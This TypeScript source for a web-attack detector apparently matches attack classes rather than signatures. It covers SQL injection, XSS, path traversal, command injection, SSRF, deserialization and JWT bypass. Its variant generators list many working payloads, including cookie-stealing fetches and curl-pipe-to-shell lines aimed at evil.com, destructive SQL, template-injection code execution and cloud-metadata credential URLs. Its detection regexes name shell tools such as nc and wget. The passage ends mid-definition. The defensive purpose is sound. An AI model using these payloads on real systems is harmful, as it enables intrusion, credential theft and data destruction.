/**
 * INVARIANT Engine — Core Variant Generation + Invariant-Class Detection
 *
 * The fundamental concept:
 *   One payload discovered → decompose into invariant property →
 *   generate defense pattern matching ALL expressions of that property →
 *   block payloads that haven't been written yet.
 *
 * A WAF matches signatures: ' OR 1=1--  →  MATCH
 *                           ' OR 2=2--  →  MISS
 *
 * INVARIANT matches the class: ' OR 1=1--  →  MATCH (tautology)
 *                              ' OR 2=2--  →  MATCH (tautology)
 *                              [novel]     →  MATCH (tautology)
 */

// ── Invariant Class Taxonomy ──────────────────────────────────────

export type InvariantClass =
    // SQL Injection invariants
    | 'sql_string_termination'
    | 'sql_tautology'
    | 'sql_union_extraction'
    | 'sql_stacked_execution'
    | 'sql_time_oracle'
    | 'sql_error_oracle'
    | 'sql_comment_truncation'

    // XSS invariants
    | 'xss_tag_injection'
    | 'xss_attribute_escape'
    | 'xss_event_handler'
    | 'xss_protocol_handler'
    | 'xss_template_expression'

    // Path traversal invariants
    | 'path_dotdot_escape'
    | 'path_null_terminate'
    | 'path_encoding_bypass'

    // Command injection invariants
    | 'cmd_separator'
    | 'cmd_substitution'
    | 'cmd_argument_injection'

    // SSRF invariants
    | 'ssrf_internal_reach'
    | 'ssrf_cloud_metadata'
    | 'ssrf_protocol_smuggle'

    // Deserialization invariants
    | 'deser_java_gadget'
    | 'deser_php_object'
    | 'deser_python_pickle'

    // Auth bypass invariants
    | 'auth_none_algorithm'
    | 'auth_header_spoof'

    // Prototype pollution
    | 'proto_pollution'

    // Log injection
    | 'log_jndi_lookup'

    // SSTI invariants (L2 evaluators)
    | 'ssti_jinja_twig'
    | 'ssti_el_expression'

    // NoSQL injection invariants (L2 evaluators)
    | 'nosql_operator_injection'
    | 'nosql_js_injection'

    // LDAP injection (L2 evaluators)
    | 'ldap_filter_injection'

    // XXE (L2 evaluators)
    | 'xxe_entity_expansion'
    | 'xml_injection'

    // CRLF (L2 evaluators)
    | 'crlf_header_injection'

    // GraphQL (L2 evaluators)
    | 'graphql_introspection'
    | 'graphql_batch_abuse'

    // Open redirect (L2 evaluators)
    | 'open_redirect_bypass'

    // Mass assignment (L2 evaluators)
    | 'mass_assignment'

    // ReDoS (L2 evaluators)
    | 'regex_dos'

// ── Invariant Definition ──────────────────────────────────────────

export interface InvariantDefinition {
    /** Unique invariant class identifier */
    readonly class: InvariantClass

    /** Human-readable description of WHY this invariant is dangerous */
    readonly description: string

    /** Attack category for grouping */
    readonly category: 'sqli' | 'xss' | 'path_traversal' | 'cmdi' | 'ssrf' | 'deser' | 'auth' | 'injection'

    /** Default severity when this invariant is detected */
    readonly severity: 'critical' | 'high' | 'medium' | 'low'

    /**
     * The defense pattern — matches the INVARIANT PROPERTY,
     * not specific payloads. This is what catches novel variants.
     *
     * Each pattern is a function for maximum expressiveness.
     * RegExp alone can't capture multi-step invariants like
     * "string terminator THEN boolean tautology THEN comment."
     */
    readonly detect: (input: string) => boolean

    /**
     * Generate N concrete variant payloads expressing this invariant.
     * Used for:
     *   1. Self-testing the defense pattern
     *   2. Generating probe payloads for internal testing
     *   3. Validating that the defense pattern catches novel variants
     */
    readonly generateVariants: (count: number) => string[]
}

export interface InvariantMatch {
    /** Which invariant class was matched */
    class: InvariantClass
    /** Detection confidence (0-1) */
    confidence: number
    /** Category for grouping */
    category: string
    /** Severity of this invariant class */
    severity: 'critical' | 'high' | 'medium' | 'low'
    /** Was this caught by invariant defense but NOT by any static signature? */
    isNovelVariant: boolean
    /** Description of the invariant */
    description: string
}


// ── Helper: Encoding Normalizer ───────────────────────────────────

/**
 * Recursively decode a string through common encoding layers.
 * Attackers stack encodings to bypass filters:
 *   %27%20OR%201%3D1--           (URL encoded)
 *   %2527%2520OR%25201%253D1--   (double URL encoded)
 *   &#39; OR 1=1--               (HTML entity)
 *   \u0027 OR 1=1--              (Unicode escape)
 *
 * We normalize all of these to plain text before invariant matching.
 */
function deepDecode(input: string, depth = 0): string {
    if (depth > 4) return input // Prevent infinite recursion

    let decoded = input

    // URL decode
    try {
        const urlDecoded = decodeURIComponent(decoded)
        if (urlDecoded !== decoded) {
            decoded = deepDecode(urlDecoded, depth + 1)
        }
    } catch { /* invalid encoding, keep original */ }

    // HTML entity decode (numeric + named)
    decoded = decoded
        .replace(/&#x([0-9a-f]+);?/gi, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
        .replace(/&#(\d+);?/g, (_, dec) => String.fromCharCode(parseInt(dec)))
        .replace(/&quot;/gi, '"')
        .replace(/&apos;/gi, "'")
        .replace(/&lt;/gi, '<')
        .replace(/&gt;/gi, '>')
        .replace(/&amp;/gi, '&')

    // Unicode escapes
    decoded = decoded.replace(/\\u([0-9a-f]{4})/gi, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16)))

    // Hex escapes
    decoded = decoded.replace(/\\x([0-9a-f]{2})/gi, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16)))

    // Collapse SQL comment-space bypass: /**/  →  space
    decoded = decoded.replace(/\/\*.*?\*\//g, ' ')

    return decoded
}


// ═══════════════════════════════════════════════════════════════════
// INVARIANT DEFINITIONS
// ═══════════════════════════════════════════════════════════════════

// ── SQL Injection Invariants ──────────────────────────────────────

const SQL_STRING_TERMINATION: InvariantDefinition = {
    class: 'sql_string_termination',
    description: 'Break out of a SQL string literal context to inject arbitrary SQL',
    category: 'sqli',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Core invariant: a string delimiter followed by SQL keywords
        // The attacker terminates a string and injects SQL
        return /['"`]\s*(?:;|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b|\bEXEC\b)/i.test(d)
    },

    generateVariants: (count: number) => {
        const terminators = ["'", '"', '`', "';", "')", "'))"]
        const injections = [
            ' OR ', ' AND ', '; DROP TABLE ', ' UNION SELECT ',
            '; INSERT INTO ', ' AND 1=CONVERT(', '; EXEC xp_',
        ]
        const suffixes = ['--', '#', '/*', '-- -', ';--', '']
        const variants: string[] = []
        for (let i = 0; i < count; i++) {
            const t = terminators[i % terminators.length]
            const inj = injections[i % injections.length]
            const s = suffixes[i % suffixes.length]
            variants.push(`${t}${inj}1${s}`)
        }
        return variants
    },
}

const SQL_TAUTOLOGY: InvariantDefinition = {
    class: 'sql_tautology',
    description: 'Boolean tautology to bypass WHERE clause authentication/authorization checks',
    category: 'sqli',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Core invariant: string terminator + boolean operator + always-true expression
        // Catches: ' OR 1=1, ' OR 'a'='a, ') OR 2>1, ' || TRUE, etc.
        return /['"`)\s]\s*(?:OR|\|\|)\s*(?:['"`]?\w+['"`]?\s*(?:=|LIKE|IS)\s*['"`]?\w+['"`]?|\d+\s*[><=]+\s*\d+|TRUE|NOT\s+FALSE|NOT\s+0|1\b)/i.test(d)
    },

    generateVariants: (count: number) => {
        const bases = [
            "' OR 1=1--",
            "' OR 'a'='a'--",
            "' OR 2>1--",
            "') OR ('x')=('x')",
            "' OR 1 LIKE 1--",
            "' OR TRUE--",
            "' OR NOT FALSE--",
            '" OR ""="',
            "' || 1#",
            "') OR 1=1/*",
            "' OR 1=1-- -",
            "admin'--",
            "' OR 'x' LIKE 'x'--",
            "' OR 1 IS NOT NULL--",
            "' OR 1 BETWEEN 0 AND 2--",
            "' OR 1=1;--",
        ]
        const encodings: Array<(s: string) => string> = [
            s => s,
            s => encodeURIComponent(s),
            s => s.replace(/ /g, '/**/'),
            s => s.replace(/ /g, '%20').replace(/'/g, '%27'),
            s => s.replace(/OR/g, 'oR'), // case variation
        ]
        const variants: string[] = []
        for (let i = 0; i < count; i++) {
            const base = bases[i % bases.length]
            const enc = encodings[Math.floor(i / bases.length) % encodings.length]
            variants.push(enc(base))
        }
        return variants
    },
}

const SQL_UNION_EXTRACTION: InvariantDefinition = {
    class: 'sql_union_extraction',
    description: 'UNION SELECT to extract data from other tables/columns',
    category: 'sqli',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /UNION\s+(?:ALL\s+)?SELECT\s/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT 1,@@version,3--",
            "') UNION SELECT 1,2,3#",
            '" UNION SELECT 1,2,3--',
            "' UNION/**/SELECT/**/1,2,3--",
            "' UnIoN SeLeCt 1,2,3--",
            "' UNION SELECT CHAR(65),2,3--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SQL_STACKED_EXECUTION: InvariantDefinition = {
    class: 'sql_stacked_execution',
    description: 'Semicolon to terminate current query and execute arbitrary SQL statements',
    category: 'sqli',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /;\s*(?:DROP|DELETE|INSERT|UPDATE|ALTER|CREATE|EXEC|EXECUTE|GRANT|REVOKE|SHUTDOWN|TRUNCATE)\s+/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            "'; DROP TABLE users--",
            "'; DELETE FROM sessions--",
            "'; INSERT INTO admins VALUES('hack','hack')--",
            "'; UPDATE users SET role='admin' WHERE id=1--",
            "'; EXEC xp_cmdshell 'whoami'--",
            "; ALTER TABLE users ADD backdoor VARCHAR(100)--",
            "'; CREATE TABLE pwned(data TEXT)--",
            '; TRUNCATE TABLE audit_log--',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SQL_TIME_ORACLE: InvariantDefinition = {
    class: 'sql_time_oracle',
    description: 'Time-based blind SQL injection using sleep/delay functions as oracle',
    category: 'sqli',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:SLEEP\s*\(|WAITFOR\s+DELAY|BENCHMARK\s*\(|PG_SLEEP\s*\(|DBMS_PIPE\.RECEIVE_MESSAGE)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' AND (SELECT pg_sleep(5))--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "1 AND SLEEP(5)",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SQL_ERROR_ORACLE: InvariantDefinition = {
    class: 'sql_error_oracle',
    description: 'Error-based SQL injection using database error messages to extract data',
    category: 'sqli',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:EXTRACTVALUE|UPDATEXML|XMLTYPE|CONVERT\s*\(.*USING|EXP\s*\(\s*~|POLYGON\s*\(|GTID_SUBSET)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
            "' AND EXP(~(SELECT * FROM (SELECT user())x))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
            "' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version)f)x))--",
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SQL_COMMENT_TRUNCATION: InvariantDefinition = {
    class: 'sql_comment_truncation',
    description: 'SQL comment syntax to truncate the remainder of a query',
    category: 'sqli',
    severity: 'medium',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Comment used with SQL keywords — not just standalone comments
        return /(?:\/\*.*?\*\/|--\s|#\s?).*?(?:SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP)/i.test(d) ||
            /(?:SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP).*?(?:\/\*|--\s|#\s?)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            "admin'--",
            "admin'/*",
            "admin'-- -",
            "admin'#",
            "' OR 1=1-- comment",
            "' UNION/**/SELECT/**/1,2,3--",
            "' AND 1=1/*bypass*/--",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── XSS Invariants ────────────────────────────────────────────────

const XSS_TAG_INJECTION: InvariantDefinition = {
    class: 'xss_tag_injection',
    description: 'Inject new HTML elements to execute arbitrary JavaScript',
    category: 'xss',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Core invariant: < followed by a tag name that can execute JS
        return /<\s*(?:script|img|svg|iframe|object|embed|video|audio|body|details|marquee|math|table|input|button|form|textarea|select|style|link|base|meta)\b/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<video><source onerror=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            "<ScRiPt>alert(1)</ScRiPt>",
            '<SCRIPT SRC=//evil.com/xss.js></SCRIPT>',
            '<style>@import "javascript:alert(1)"</style>',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const XSS_EVENT_HANDLER: InvariantDefinition = {
    class: 'xss_event_handler',
    description: 'Inject HTML event handler attributes to execute JavaScript',
    category: 'xss',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Core invariant: on[event]= in a context that could be an HTML attribute
        return /\bon(?:error|load|click|mouseover|mouseenter|focus|blur|submit|change|input|keydown|keyup|keypress|drag|drop|animation(?:end|start|iteration)|transition(?:end|run|start)|pointer(?:down|up|over)|touch(?:start|end|move)|resize|scroll|wheel|toggle|abort|beforeunload|unload|message|storage|hashchange|popstate)\s*=/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '" onerror="alert(1)',
            "' onfocus='alert(1)' autofocus='",
            '" onmouseover="alert(1)',
            '" onload="alert(1)',
            '" onclick="alert(1)',
            '" onchange="alert(1)',
            '" oninput="alert(1)',
            '" onkeydown="alert(1)',
            '" ondragstart="alert(1)',
            '" onanimationend="alert(1)',
            '" onpointerdown="alert(1)',
            '" ontouchstart="alert(1)',
            '" onscroll="alert(1)',
            '" ontoggle="alert(1)',
            "' ONERROR='alert(1)'",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const XSS_PROTOCOL_HANDLER: InvariantDefinition = {
    class: 'xss_protocol_handler',
    description: 'Use javascript: or data: URI protocol to execute code in attribute context',
    category: 'xss',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Invariant: javascript: or data:text/html used to trigger execution
        return /(?:javascript|vbscript|data)\s*:/i.test(d) &&
            /(?:alert|confirm|prompt|eval|Function|constructor|document\.|window\.|fetch|XMLHttp)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            'javascript:alert(1)',
            'javascript:alert(document.cookie)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            "java\tscript:alert(1)",
            'javascript:eval("al"+"ert(1)")',
            'javascript:window["alert"](1)',
            'javascript:Function("alert(1)")()',
            'javascript:fetch("//evil.com/"+document.cookie)',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const XSS_TEMPLATE_EXPRESSION: InvariantDefinition = {
    class: 'xss_template_expression',
    description: 'Inject template expressions to achieve code execution in template engine context',
    category: 'xss',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Template delimiters with expressions that look like code
        return /(?:\{\{.*?(?:constructor|__proto__|process|require|import|eval|exec|spawn|Function).*?\}\}|\$\{.*?(?:constructor|process|require).*?\}|<%.*?(?:eval|exec|system|require).*?%>)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '{{constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")}}',
            '{{7*7}}',
            "${require('child_process').execSync('id')}",
            '<%=system("id")%>',
            '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            '#{7*7}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const XSS_ATTRIBUTE_ESCAPE: InvariantDefinition = {
    class: 'xss_attribute_escape',
    description: 'Break out of HTML attribute context to inject new attributes or elements',
    category: 'xss',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Invariant: quote followed by > to close tag, then new tag or event handler
        return /['"][^'"]*?(?:>.*?<|>\s*<|\s+on\w+\s*=)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '"><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>",
            '" ><svg onload=alert(1)>',
            "' autofocus onfocus=alert(1) x='",
            '"><iframe src="javascript:alert(1)">',
            "' style='animation-name:x' onanimationstart='alert(1)' x='",
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── Path Traversal Invariants ─────────────────────────────────────

const PATH_DOTDOT_ESCAPE: InvariantDefinition = {
    class: 'path_dotdot_escape',
    description: 'Use ../ sequences to escape the webroot and access arbitrary files',
    category: 'path_traversal',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:\.\.[\/\\]){2,}/i.test(d) ||
            /(?:\.\.%2[fF]|%2[eE]%2[eE]%2[fF]|\.\.%5[cC]){2,}/.test(input)
    },

    generateVariants: (count: number) => {
        const targets = ['/etc/passwd', '/etc/shadow', '/proc/self/environ', '/windows/win.ini']
        const prefixes = [
            '../../../',
            '..\\..\\..\\',
            '....//....//....//..../',
            '..%2F..%2F..%2F',
            '..%252F..%252F..%252F',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '..%c0%af..%c0%af..%c0%af',
            '..%5c..%5c..%5c',
        ]
        const variants: string[] = []
        for (let i = 0; i < count; i++) {
            variants.push(prefixes[i % prefixes.length] + targets[i % targets.length])
        }
        return variants
    },
}

const PATH_NULL_TERMINATE: InvariantDefinition = {
    class: 'path_null_terminate',
    description: 'Null byte injection to truncate file extension checks',
    category: 'path_traversal',
    severity: 'high',

    detect: (input: string) => {
        return /%00|\\x00|\\0|\0/.test(input)
    },

    generateVariants: (count: number) => {
        const variants = [
            '../../../etc/passwd%00.jpg',
            '..\\..\\..\\etc\\passwd%00.png',
            'shell.php%00.gif',
            '/etc/passwd\\x00.html',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const PATH_ENCODING_BYPASS: InvariantDefinition = {
    class: 'path_encoding_bypass',
    description: 'Multi-layer encoding to bypass path traversal filters',
    category: 'path_traversal',
    severity: 'high',

    detect: (input: string) => {
        // Check for double/triple encoding of ../ or sensitive paths BEFORE full decode
        return /%252[eE]%252[eE]|%25252|%c0%ae|%c0%af|%e0%80%ae|\.%00\./.test(input) ||
            /\/etc\/(?:passwd|shadow|hosts)|\/proc\/self\/(?:environ|cmdline|maps)|\/windows\/(?:system32|win\.ini)/i.test(deepDecode(input))
    },

    generateVariants: (count: number) => {
        const variants = [
            '%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%afetc/passwd',
            '..%e0%80%ae/etc/passwd',
            '%25252e%25252e%25252f',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── Command Injection Invariants ──────────────────────────────────

const CMD_SEPARATOR: InvariantDefinition = {
    class: 'cmd_separator',
    description: 'Shell command separators to chain arbitrary command execution',
    category: 'cmdi',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Invariant: command separator followed by known system commands
        return /[;|&`]\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b/i.test(d)
    },

    generateVariants: (count: number) => {
        const seps = [';', '|', '&&', '||', '\n', '`', '$IFS']
        const cmds = ['id', 'whoami', 'cat /etc/passwd', 'ls -la', 'uname -a', 'curl evil.com/shell.sh|sh']
        const variants: string[] = []
        for (let i = 0; i < count; i++) {
            variants.push(`${seps[i % seps.length]} ${cmds[i % cmds.length]}`)
        }
        return variants
    },
}

const CMD_SUBSTITUTION: InvariantDefinition = {
    class: 'cmd_substitution',
    description: 'Command substitution syntax to embed command output in another context',
    category: 'cmdi',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)/i.test(d) ||
            /`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '$(id)',
            '$(cat /etc/passwd)',
            '`whoami`',
            '`curl evil.com/shell.sh`',
            '$(bash -c "id")',
            '$(python -c "import os;os.system(\'id\')")',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const CMD_ARGUMENT_INJECTION: InvariantDefinition = {
    class: 'cmd_argument_injection',
    description: 'Inject arguments or flags into commands that accept user-controlled values',
    category: 'cmdi',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        // Argument injection: --, -o, --output, etc. in contexts suggesting command args
        return /(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell)\b/i.test(d) ||
            /\s-[oe]\s+(?:\/|http)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '--output=/tmp/pwned',
            '-o /tmp/shell.php',
            '--exec=bash',
            '--post-file=/etc/passwd',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── SSRF Invariants ───────────────────────────────────────────────

const SSRF_INTERNAL_REACH: InvariantDefinition = {
    class: 'ssrf_internal_reach',
    description: 'Reach internal network addresses through server-side request',
    category: 'ssrf',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:https?:\/\/)?(?:127\.0\.0\.1|localhost|0\.0\.0\.0|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|0x7f|2130706433|017700000001|\[::1?\]|0177\.0\.0\.01)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://10.0.0.1',
            'http://192.168.1.1',
            'http://172.16.0.1',
            'http://[::1]',
            'http://0x7f000001',
            'http://2130706433',
            'http://0177.0.0.01',
            'http://127.1',
            'http://127.0.0.1:8080/admin',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SSRF_CLOUD_METADATA: InvariantDefinition = {
    class: 'ssrf_cloud_metadata',
    description: 'Access cloud provider metadata endpoints to steal credentials/tokens',
    category: 'ssrf',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254|metadata\.azure\.com/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://100.100.100.200/latest/meta-data/',
            'http://169.254.169.254/metadata/v1/',
            'http://[fd00:ec2::254]/latest/meta-data/',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const SSRF_PROTOCOL_SMUGGLE: InvariantDefinition = {
    class: 'ssrf_protocol_smuggle',
    description: 'Use non-HTTP protocol handlers (file://, gopher://) to access internal resources',
    category: 'ssrf',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /(?:file|gopher|dict|ldap|tftp|ftp|jar|netdoc|phar):\/\//i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall',
            'dict://127.0.0.1:6379/INFO',
            'ldap://evil.com/x',
            'file:///c:/windows/win.ini',
            'phar:///tmp/evil.phar',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── Deserialization Invariants ─────────────────────────────────────

const DESER_JAVA_GADGET: InvariantDefinition = {
    class: 'deser_java_gadget',
    description: 'Java deserialization gadget chain to achieve remote code execution',
    category: 'deser',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /aced0005|rO0ABX/i.test(d) ||
            /(?:java\.lang\.Runtime|ProcessBuilder|ChainedTransformer|InvokerTransformer|ConstantTransformer|commons-collections|ysoserial)/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = ['rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', 'aced00057372']
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const DESER_PHP_OBJECT: InvariantDefinition = {
    class: 'deser_php_object',
    description: 'PHP object injection via unserialize() to trigger magic methods',
    category: 'deser',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /O:\d+:"[^"]+"/i.test(d) || /a:\d+:\{/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}',
            'O:11:"Application":1:{s:3:"cmd";s:2:"id";}',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const DESER_PYTHON_PICKLE: InvariantDefinition = {
    class: 'deser_python_pickle',
    description: 'Python pickle deserialization to execute arbitrary code via __reduce__',
    category: 'deser',
    severity: 'critical',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /\x80\x04\x95|cos\nsystem|cbuiltins\n|c__builtin__|cposix\nsystem/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = ["cos\nsystem\n(S'id'\ntR.", "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── Auth Bypass Invariants ────────────────────────────────────────

const AUTH_NONE_ALGORITHM: InvariantDefinition = {
    class: 'auth_none_algorithm',
    description: 'JWT alg:none attack to bypass signature verification entirely',
    category: 'auth',
    severity: 'critical',

    detect: (input: string) => {
        // Check Authorization header content for alg:none
        try {
            if (!input.includes('.')) return false
            const parts = input.split('.')
            if (parts.length !== 3) return false
            const header = JSON.parse(atob(parts[0].replace('Bearer ', '')))
            return header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE' || header.alg === 'nOnE'
        } catch {
            return false
        }
    },

    generateVariants: (count: number) => {
        const variants = [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const AUTH_HEADER_SPOOF: InvariantDefinition = {
    class: 'auth_header_spoof',
    description: 'Spoof proxy/forwarding headers to bypass IP-based access controls',
    category: 'auth',
    severity: 'medium',

    // Note: this invariant is checked differently — it looks at headers, not request body/path
    detect: (_input: string) => false, // Checked via dedicated header analysis, not input text

    generateVariants: (count: number) => {
        const variants = [
            'X-Forwarded-For: 127.0.0.1',
            'X-Original-URL: /admin',
            'X-Rewrite-URL: /admin',
            'X-Custom-IP-Authorization: 127.0.0.1',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}


// ── Injection Invariants ──────────────────────────────────────────

const PROTO_POLLUTION: InvariantDefinition = {
    class: 'proto_pollution',
    description: 'Prototype pollution to modify object prototypes and gain code execution',
    category: 'injection',
    severity: 'high',

    detect: (input: string) => {
        const d = deepDecode(input)
        return /__proto__|constructor\s*\[\s*['"]?prototype['"]?\s*\]|constructor\.prototype|Object\.assign.*__proto__/i.test(d)
    },

    generateVariants: (count: number) => {
        const variants = [
            '__proto__[isAdmin]=true',
            'constructor[prototype][isAdmin]=true',
            '__proto__.toString=1',
            '{"__proto__":{"isAdmin":true}}',
            'constructor.prototype.polluted=true',
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}

const LOG_JNDI_LOOKUP: InvariantDefinition = {
    class: 'log_jndi_lookup',
